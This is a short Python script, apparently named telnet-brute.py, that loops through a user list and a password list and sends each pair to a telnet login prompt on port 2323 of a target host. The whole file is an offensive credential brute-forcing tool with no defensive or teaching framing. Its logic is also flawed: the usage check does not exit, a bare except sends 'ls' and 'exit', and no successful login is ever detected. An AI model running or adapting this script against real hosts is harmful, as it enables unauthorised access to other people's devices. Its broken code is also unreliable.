from telnetlib import Telnet
import sys
if len(sys.argv) < 2:
    print("usage: ./telnet-brute.py <host> <userlist> <passlist>")

userlist = open(sys.argv[2]).read().splitlines()
passlist = open(sys.argv[3]).read().splitlines()

host = sys.argv[1]
port = 2323

print("trying host: ", host)
with Telnet(host, port) as tn:
        for user in userlist:
            for password in passlist:
                try:
                    print("tryping user: ", user, " with password: ", password)
                    tn.read_until(b"login: ")
                    tn.write(user.encode('ascii') + b"\n")
                    tn.read_until(b"Password: ")
                    tn.write(password.encode('ascii') + b"\n")
                except:
                    tn.write(b"ls\n")
                    tn.write(b"exit\n")
            